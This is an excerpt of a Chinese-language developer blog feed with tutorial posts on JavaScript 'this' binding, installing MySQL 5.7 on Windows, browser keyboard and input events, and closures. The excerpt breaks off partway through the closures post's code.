class="keyword">new</span> fn;</span><br><span class="line"><span class="built_in">console</span>.log(a.name); <span class="comment">// jack</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>如何准确判断this指向的是什么？</strong></p><ol><li>函数是否在new中调用(new绑定)，如果是，那么this绑定的是新创建的对象。  </li><li>函数是否通过call,apply调用，或者使用了bind(即硬绑定)，如果是，那么this绑定的就是指定的对象。  </li><li>函数是否在某个上下文对象中调用(隐式绑定)，如果是的话，this绑定的是那个上下文对象。一般是obj.foo()  </li><li>如果以上都不是，那么使用默认绑定。如果在严格模式下，则绑定到undefined，否则绑定到全局对象。  </li><li>如果把Null或者undefined作为this的绑定对象传入call、apply或者bind，这些值在调用时会被忽略，实际应用的是默认绑定规则。  </li><li>如果是箭头函数，箭头函数的this继承的是外层代码块的this。  </li></ol><p><strong>到这里你对this有了一定的深刻理解，接下来我们来分析以下文章开头的那道题目：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    number: <span class="number">3</span>,</span><br><span class="line">    fn: (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> number;</span><br><span class="line">        <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">        number = number * <span class="number">2</span>;</span><br><span class="line">        number = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> num = <span class="keyword">this</span>.number;</span><br><span class="line">            <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(num);</span><br><span class="line">            number *= <span class="number">3</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> myFun = obj.fn;</span><br><span class="line">myFun.call(<span class="literal">null</span>);</span><br><span class="line">obj.fn();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.number);</span><br></pre></td></tr></table></figure><ol><li><p>在定义obj的时候，fn对应的闭包就执行了，返回其中的函数，执行闭包中代码时，显然应用不了new绑定(没有出现new 关键字)，硬绑定也没有(没有出现call,apply,bind关键字),隐式绑定有没有？很显然没有，如果没有XX.fn()，那么可以肯定没有应用隐式绑定，所以这里应用的就是默认绑定了，非严格模式下this绑定到了window上(浏览器执行环境)。【这里很容易被迷惑的就是以为this指向的是obj，一定要注意，除非是箭头函数，否则this跟词法作用域是两回事，一定要牢记在心】</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.number * = <span class="number">2</span>; <span class="comment">//window.number的值是10(var number定义的全局变量是挂在window上的)</span></span><br><span class="line"></span><br><span class="line">number = number * <span class="number">2</span>; <span class="comment">//number的值是NaN;注意我们这边定义了一个number，但是没有赋值，number的值是undefined;Number(undefined)-&gt;NaN</span></span><br><span class="line"></span><br><span class="line">number = <span class="number">3</span>;  <span class="comment">//number的值为3</span></span><br></pre></td></tr></table></figure></li><li><p>myFun.call(null);我们前面说了，call的第一个参数传null，调用的是默认绑定;</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> num = <span class="keyword">this</span>.number;</span><br><span class="line">  <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(num);</span><br><span class="line">  number *= <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行时:  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="keyword">this</span>.number; <span class="comment">//num=10; 此时this指向的是window</span></span><br><span class="line"><span class="keyword">this</span>.number * = <span class="number">2</span>;  <span class="comment">//window.number = 20</span></span><br><span class="line"><span class="built_in">console</span>.log(num);  <span class="comment">//输出结果为10</span></span><br><span class="line">number *= <span class="number">3</span>;  <span class="comment">//number=9; 这个number对应的闭包中的number;闭包中的number的是3</span></span><br><span class="line"><span class="built_in">console</span>.log(number);  <span class="comment">//输出的结果是9</span></span><br></pre></td></tr></table></figure></li><li><p>obj.fn();应用了隐式绑定，fn中的this对应的是obj.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="keyword">this</span>.number;<span class="comment">//num = 3;此时this指向的是obj</span></span><br><span class="line"><span class="keyword">this</span>.number *= <span class="number">2</span>; <span class="comment">//obj.number = 6;</span></span><br><span class="line"><span class="built_in">console</span>.log(num); <span class="comment">//输出结果为3;</span></span><br><span class="line">number *= <span class="number">3</span>; <span class="comment">//number=27;这个number对应的闭包中的number;闭包中的number的此时是9</span></span><br><span class="line"><span class="built_in">console</span>.log(number);<span class="comment">//输出的结果是27</span></span><br></pre></td></tr></table></figure></li><li><p>最后一步console.log(window.number);输出的结果是20  </p><p>因此组中结果为:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">27</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure></li></ol><p>严格模式下结果，自己分析。</p><p><strong>接着再来一道测试题，自己去分析一下：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = &#123;</span><br><span class="line">  value: <span class="number">2</span>,</span><br><span class="line">  bar: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//示例1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar());</span><br><span class="line"><span class="comment">//示例2</span></span><br><span class="line"><span class="built_in">console</span>.log((foo.bar)());</span><br><span class="line"><span class="comment">//示例3</span></span><br><span class="line"><span class="built_in">console</span>.log((foo.bar = foo.bar)());</span><br><span class="line"><span class="comment">//示例4</span></span><br><span class="line"><span class="built_in">console</span>.log((<span class="literal">false</span> || foo.bar)());</span><br><span class="line"><span class="comment">//示例5</span></span><br><span class="line"><span class="built_in">console</span>.log((foo.bar, foo.bar)());</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://fecoding.cn/2016/09/15/the-rule-of-binding-this-in-javascript/" target="_blank" rel="noopener">JavaScript 中 this 的四条绑定规则</a></li><li><a href="https://github.com/YvetteLau/Blog/issues/6" target="_blank" rel="noopener">嗨，你真的懂this吗？</a></li><li><a href="https://github.com/SimonZhangITer/MyBlog/issues/12" target="_blank" rel="noopener">This其实不难，通过实例全面解析JS中的This</a></li><li><a href="https://segmentfault.com/a/1190000002640298#articleHeader1" target="_blank" rel="noopener">JavaScript中的this陷阱的最全收集–没有之一</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作为一名前端工作人员，日常工作中常常需要与&lt;code&gt;this&lt;/code&gt;打交道,但你真的懂&lt;code&gt;this&lt;/code&gt;吗？this是什么？有什么用？this是如何工作的？下面让我们来深入了解一下JavaScript中的&lt;code&gt;this&lt;/code&gt;吧！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL-install</title>
    <link href="https://jiuylq.github.io/2019/05/16/mysql-install/"/>
    <id>https://jiuylq.github.io/2019/05/16/mysql-install/</id>
    <published>2019-05-16T07:25:23.000Z</published>
    <updated>2019-07-10T13:01:04.881Z</updated>
    
    <content type="html"><![CDATA[<p>MySQL的安装记录，本文主要是记录一下图和在window上安装MySQL数据库<br><a id="more"></a></p><h1 id="MySQL-安装"><a href="#MySQL-安装" class="headerlink" title="MySQL 安装"></a>MySQL 安装</h1><p><em>作为一名开发者日常生活中需要和数据库打交道，所以本文总结了一次mysql 5.7的安装过程中所遇到的一些问题，及安装过程（环境window 10，mysql5.7.zip）</em></p><h2 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h2><p>从MySQL官网上下载<a href="https://dev.mysql.com/downloads/mysql/5.7.html#downloads" target="_blank" rel="noopener">mysql5.7.zip</a>文件并解压到待安装目录</p><blockquote><p>注意：<br>由于mysql5.7版本不会自带默认配置文件<code>my.ini</code>,所以需要的话可以从<a href="https://dev.mysql.com/downloads/mysql/5.6.html#downloads" target="_blank" rel="noopener">mysql5.6</a>中的<code>my-default.ini</code>复制到安装目录下的<code>my.ini</code>文件中,详情请看<a href="https://dev.mysql.com/doc/refman/5.7/en/server-configuration-defaults.html" target="_blank" rel="noopener">官网说明</a></p></blockquote><p>本人安装时使用的配置文件<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For advice on how to change settings please see</span></span><br><span class="line"><span class="comment"># http://dev.mysql.com/doc/refman/5.6/en/server-configuration-defaults.html</span></span><br><span class="line"><span class="comment"># *** DO NOT EDIT THIS FILE. It's a template which will be copied to the</span></span><br><span class="line"><span class="comment"># *** default location during install, and will be replaced if you</span></span><br><span class="line"><span class="comment"># *** upgrade to a newer version of MySQL.</span></span><br><span class="line"></span><br><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="comment"># 设置mysql客户端默认字符集</span></span><br><span class="line"><span class="comment"># default-character-set=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove leading # and set to the amount of RAM for the most important data</span></span><br><span class="line"><span class="comment"># cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%.</span></span><br><span class="line"><span class="comment"># innodb_buffer_pool_size = 128M</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove leading # to turn on a very important data integrity option: logging</span></span><br><span class="line"><span class="comment"># changes to the binary log between backups.</span></span><br><span class="line"><span class="comment"># log_bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># These are commonly set, remove the # and set as required.</span></span><br><span class="line"><span class="comment"># basedir = .....</span></span><br><span class="line"><span class="comment"># datadir = .....</span></span><br><span class="line"><span class="comment"># port = 3306</span></span><br><span class="line"><span class="comment"># server_id = .....</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove leading # to set options mainly useful for reporting servers.</span></span><br><span class="line"><span class="comment"># The server defaults are faster for transactions and fast SELECTs.</span></span><br><span class="line"><span class="comment"># Adjust sizes as needed, experiment to find the optimal values.</span></span><br><span class="line"><span class="comment"># join_buffer_size = 128M</span></span><br><span class="line"><span class="comment"># sort_buffer_size = 2M</span></span><br><span class="line"><span class="comment"># read_rnd_buffer_size = 2M </span></span><br><span class="line"></span><br><span class="line"><span class="attr">sql_mode</span>=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES </span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许最大连接数</span></span><br><span class="line"><span class="comment"># max_connections=20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务端使用的字符集默认为8比特编码的latin1字符集</span></span><br><span class="line"><span class="comment"># character-set-server=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新表时将使用的默认存储引擎</span></span><br><span class="line"><span class="comment"># default-storage-engine=INNODB</span></span><br></pre></td></tr></table></figure></p><p><strong>由于<code>mysql5.7</code>版本默认没有data目录文件，所以需要进行初始化（<a href="https://dev.mysql.com/doc/refman/5.7/en/data-directory-initialization-mysqld.html" target="_blank" rel="noopener">官网说明</a>）</strong><br>进入到<code>mysql5.7</code>的解压目录中（我的是e:\Server\Mysql）以管理员的方式在当前目录打开终端，进行如下操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> bin <span class="comment"># 进入到bin目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后初始化data目录 （一下二选一）</span></span><br><span class="line">mysqld --initialize <span class="comment"># 默认设置随机密码 （密码在当你登录mysql时候的错误日志里面）或输入 mysqld --initialize --console 秘密会直接打印出来</span></span><br><span class="line">mysqld --initialize-insecure <span class="comment"># 默认没有密码</span></span><br></pre></td></tr></table></figure></p><p>二、安装</p><p>完成第一步的配置后我们可以正式进入<code>MySQL</code>的安装了<br>继续在终端中输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#紧接上一步继续在解压目录中的bin中执行后续操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># install</span></span><br><span class="line">mysqld -install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装完成后启动mysql</span></span><br><span class="line">net start mysql</span><br></pre></td></tr></table></figure><p>至此，你已经完成<code>mysql5.7</code>的基本安装，下面还需要给mysql设置的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在命令行中输入下面指令进入到mysql中</span></span><br><span class="line">mysql -u root -p <span class="comment"># 默认会提示你输入密码，不用管直接enter进入到mysql命令行中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接着修改root的密码</span></span><br><span class="line"></span><br><span class="line">SET PASSWORD FOR <span class="string">'root'</span>@<span class="string">'localhost'</span> = PASSWORD(<span class="string">'new_password'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改完成后可以执行一下测试</span></span><br><span class="line"><span class="comment"># 退出mysql命令行（以下三选一即可）</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">quit</span><br><span class="line">\q</span><br><span class="line"></span><br><span class="line"><span class="comment">#重新在输入mysql -u root -p 输入刚刚设置的密码即可</span></span><br></pre></td></tr></table></figure><blockquote><p>看到这里是不是感觉MySQL的安装也不是特别的折腾啊（这里只是简单的配置安装，哈哈，够用就好）</p></blockquote><p>三、<code>MySQL</code>的一些基本操作</p><p>前面我讲到了MySQL的安装的基本草做，接着我们得扩充一下对MySQL的基本操作是吧：</p><p>在命令行中进入到bin中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止MySQL服务</span></span><br><span class="line">net stop mysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载服务</span></span><br><span class="line">mysqld --remove mysql</span><br></pre></td></tr></table></figure></p><p>至此<code>mysql5.7</code>的安装体验正式完成，欢迎大家一起学习进步，如本文中有什么不足之处请联系我，谢谢！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;MySQL的安装记录，本文主要是记录一下图和在window上安装MySQL数据库&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>input-event</title>
    <link href="https://jiuylq.github.io/2019/05/16/input-event/"/>
    <id>https://jiuylq.github.io/2019/05/16/input-event/</id>
    <published>2019-05-16T07:19:43.000Z</published>
    <updated>2019-07-10T13:04:03.879Z</updated>
    
    <content type="html"><![CDATA[<p>工作中我们常常需要跟数据进行打交道，既然用到了数据那就常常需要用到表单/输入框了，今天我们就来探讨一下输入框的事件吧！<br><a id="more"></a></p><h2 id="input输入框功能"><a href="#input输入框功能" class="headerlink" title="input输入框功能"></a><font color="#00ffff">input输入框功能</font></h2><p>1、事件<br>　　1、keydown: 当用户按下任意键时触发，而且按住不放的话，会重复触发此事件。<br>　　2、keypress: 当用户按下字符键时触发，而且按住不放的话，会重复触发此事件。按下Esc键也会触发这个事件，Safari3.1之前的版本按下非字符键时也触发。<br>　　3、keyup: 当用户释放键时触发。<br>　　4、textInput：事件只会在用户按下能够输入实际字符的键时才会触发(textInput属性对火狐浏览器无兼容,目前只有safari、chrome支持)<br>　　5、onchange：事件在内容改变（两次内容有可能还是相等的）且失去焦点时触发。<br>　　6、onpropertychange 事件却是实时触发，即每增加或删除一个字符就会触发，通过 js 改变也会触发该事件，但是该事件 IE 专有。<br>　　7、oninput 事件是 IE 之外的大多数浏览器支持的事件，在 value 改变时触发，实时的，即每增加或删除一个字符就会触发，然而通过 js 改变 value 时，却不会触发。  </p><blockquote><p>注：<br> (1) onpropertychange 事件是任何属性改变都会触发的，而 oninput 却只在 value 改变时触发，oninput 要通过 addEventListener() 来注册，onpropertychange 注册方式跟一般事件一样。（此处都是指在js中动态绑定事件，以实现内容与行为分离）<br>（2）oninput 事件：a). 当脚本中改变 value 时，不会触发；b).从浏览器的自动下拉提示中选取时，不会触发。<br>（3）onpropertychange 事件：当 input 设置为 disable=tru e后，onpropertychange 不会触发。</p></blockquote><blockquote><p>注意：<font color="#00ffff"><br>英文输入法：按下键盘时会触发键盘事件，次序为keydown -&gt; keypress -&gt;keyup<br>中文输入法：<br>firfox：输入触发keydown，回车确认输入触发keyup(最新不会触发keydown)<br>chrome：输入触发keydown、keyup，回车确认输入只触发keydown<br>IE：输入触发keydown、keyup，回车确认输入触发keydown，keyup<br>Safari：输入触发keydown、keyup，回车确认输入触发keydown，keyup<br>opera：输入触发keydown、keyup，回车确认输入触发keydown，keyup </font></p></blockquote><p>keypress事件不能对系统功能键(例如：后退、删除等，其中对中文输入法不能有效响应)进行正常的响应，keydown和keyup均可以对系统功能键进行有效的拦截，但事件截获的位置不同。  </p><p>键盘中的键分为字符(可打印)键和功能键(不可打印)，系统功能键包括如下：<br>　　Esc、Tab、Caps Lock、Shift、Ctrl、Alt、Enter、Backspace、Print Screen、Scroll Lock、Pause Break、Insert、Delete、Home、End、Page Up、Page Down， F1 through F12，Num Lock、The Arrow Keys。  </p><p>keypress响应系统功能键总结：<br>　　Firefox：支持 Esc、Enter、Backspace、Pause Break、Insert、Delete、Home、End、Page Up、Page Down、F1 through F12、The Arrow Keys<br>　　Chrome：支持Enter<br>　　Oprea：支持Enter<br>　　Safari：支持Enter<br>　　IE：支持Esc、Enter</p><p>ps:<br>firefox：上下左右键会触发kepress.<br>chrome： 上下左右键不会触发kepress.<br>oprea：上下左右键不会触发kepress.<br>safari：上下左右键不会触发kepress.<br>IE：上下左右键不会触发kepress.</p><p>================================================================================  </p><p>keyCode(键码), which, charCode(字符编码)<br>keydown: 获得keyCode， charCode=0<br>keypress: 字符（英文区分大小写+数字  / * , .  …等非功能键），keyCode=0 ，获取charCode值， 反之获取keyCode， charCode=0<br>keyup: 获得keyCode， charCode=0<br>jquery 中 event.which = original.charCode != null ? original.charCode : original.keyCode;<br>总结：回车、上下左右、等功能键keydown、keypress、keyup都获取keyCode，并且值相等。</p><p>开启大写情况，keydown、keypress(字母，主键盘数字、回车)、keyup，which值相等，小写kepress获取的which不同于keypress、keyup。<br>keypress事件的keyCode对字母的大小写敏感，而keydown、keyup事件不敏感<br>keypress事件的which值无法区分主键盘上的数字键和附键盘数字键的，而keydown、keyup的which值对主附键盘的数字键敏感。<br>【IE(ie9以下)只有一个属性KeyCode属性，当为keydown和keyup 事件是，keycode属性表示你具体按下的键(也称为virtual keycode)，当捕捉的是keypress事件时keyCode属性指的是你键入的字符(character code)<br>标准浏览器中情况有些不同，event对象包含一个keyCode属性和一个charCode属性，keydown和keyup事件的时候，keyCode表示的就是你具体按的键，charCode为0；当捕捉的是keypress事件时，keyCode为0，charCode指的是你按下的字符，鉴于IE和FF中的区别，如果你比较懒的话，建议只使用keydow和keyup事件】  </p><p>/<em>本文所涉及浏览器(除ie)都为最新版本</em>/</p><p><a href="https://www.cnblogs.com/silence516/archive/2013/01/25/2876611.html" target="_blank" rel="noopener">https://www.cnblogs.com/silence516/archive/2013/01/25/2876611.html</a></p><p><a href="http://www.runoob.com/jsref/event-oninput.html" target="_blank" rel="noopener">http://www.runoob.com/jsref/event-oninput.html</a></p><p><a href="https://www.cnblogs.com/leolai/archive/2012/08/01/2618386.html" target="_blank" rel="noopener">https://www.cnblogs.com/leolai/archive/2012/08/01/2618386.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;工作中我们常常需要跟数据进行打交道，既然用到了数据那就常常需要用到表单/输入框了，今天我们就来探讨一下输入框的事件吧！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JavaScript闭包</title>
    <link href="https://jiuylq.github.io/2019/05/16/closure/"/>
    <id>https://jiuylq.github.io/2019/05/16/closure/</id>
    <published>2019-05-16T07:17:49.000Z</published>
    <updated>2019-07-10T13:11:20.011Z</updated>
    
    <content type="html"><![CDATA[<p>小二：客官你知道Closure吗？<br>客官：Closure不就是闭包吗<br>小二：你知道它有什么用吗？或者为什么要用它呢？<br>客官：…有话就讲，别吹牛皮<br>小二：（心中万马在奔腾）好吧，今天让我们来讲讲闭包吧<br><a id="more"></a></p><h2 id="Closure-闭包"><a href="#Closure-闭包" class="headerlink" title="Closure 闭包"></a>Closure 闭包</h2><h3 id="什么是闭包（Closure）"><a href="#什么是闭包（Closure）" class="headerlink" title="什么是闭包（Closure）"></a>什么是闭包（Closure）</h3><p>简单讲，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures" target="_blank" rel="noopener">闭包</a>就是指有权访问另一个函数作用域中的变量的函数。</p><p>MDN 上面这么说：闭包是一种特殊的对象。它由两部分构成：函数，以及创建该函数的环境。环境由闭包创建时在作用域中的任何局部变量组成。</p><h3 id="产生一个闭包"><a href="#产生一个闭包" class="headerlink" title="产生一个闭包"></a>产生一个闭包</h3><p>创建闭包最常见方式，就是在一个函数内部创建另一个函数。下面例子中的 closure 就是一个闭包：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>,b = <span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">closure</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> closure;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>闭包的作用域链包含着它自己的作用域，以及包含它的函数的作用域和全局作用域。</p><h3 id="闭包的注意事项"><a href="#闭包的注意事项" class="headerlink" title="闭包的注意事项"></a>闭包的注意事项</h3><ul><li>通常，函数的作用域及其所有变量都会在函数执行结束后被销毁。但是，在创建了一个闭包以后，这个函数的作用域就会一直保存到闭包不存在为止。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeAdder</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> add5 = makeAdder(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> add10 = makeAdder(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(add5(<span class="number">2</span>));  <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">console</span>.log(add10(<span class="number">2</span>)); <span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放对闭包的引用</span></span><br><span class="line">add5 = <span class="literal">null</span>;</span><br><span class="line">add10 = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li></ul><p>add5 和 add10 都是闭包。它们共享相同的函数定义，但是保存了不同的环境。在 add5 的环境中，x 为 5。而在 add10 中，x 则为 10。最后通过 null 释放了 add5 和 add10 对闭包的引用。</p><blockquote><p>在javascript中，如果一个对象不再被引用，那么这个对象就会被垃圾回收机制回收；<br>如果两个对象互相引用，而不再被第3者所引用，那么这两个互相引用的对象也会被回收。</p></blockquote><ul><li>闭包只能取得包含函数中任何变量的最后一个值，这是因为闭包所保存的是整个变量对象，而不是某个特殊的变量。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">    arr[i] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> a = <span class="number">0</span>;a &lt; <span class="number">10</span>;a++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arr[a]());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">test(); <span class="comment">// 连续打印 10 个 10</span></span><br></pre></td></tr></table></figure><p>对于上面的情况，如果我们改变代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 